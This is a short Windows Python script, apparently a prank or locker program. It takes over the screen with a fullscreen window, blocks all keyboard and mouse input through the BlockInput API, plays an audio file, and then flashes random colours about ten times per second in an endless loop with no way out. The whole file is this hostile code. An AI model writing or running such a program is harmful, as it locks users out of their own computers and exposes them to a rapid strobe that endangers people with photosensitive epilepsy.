import time
from turtle import Screen
import random as r
import ctypes
from ctypes import wintypes
import playsound
import threading
light="ABCDEF"
dark="012345"
color="#"

wn=Screen()
screen = Screen()
screenTk = screen.getcanvas().winfo_toplevel()
rootwindow = wn.getcanvas().winfo_toplevel()
rootwindow.call('wm', 'attributes', '.', '-topmost', '1')
rootwindow.call('wm', 'attributes', '.', '-topmost', '0')
screenTk.attributes("-fullscreen", True)
BlockInput = ctypes.windll.user32.BlockInput
BlockInput.argtypes = [wintypes.BOOL]
BlockInput.restype = wintypes.BOOL
BlockInput(True)

def ps(filepath="salinewin.wav"):
    playsound.playsound(filepath)
 
playsound.playsound("salinewin.wav",block=True)
time.sleep(1)
while True:
    for y in range(6):
        color+=light[r.randint(0,5)]
    screen.bgcolor(color)
    time.sleep(0.05)
    color="#"
    for z in range(6):
        color+=dark[r.randint(0,5)]
    screen.bgcolor(color)
    time.sleep(0.05)
    color="#"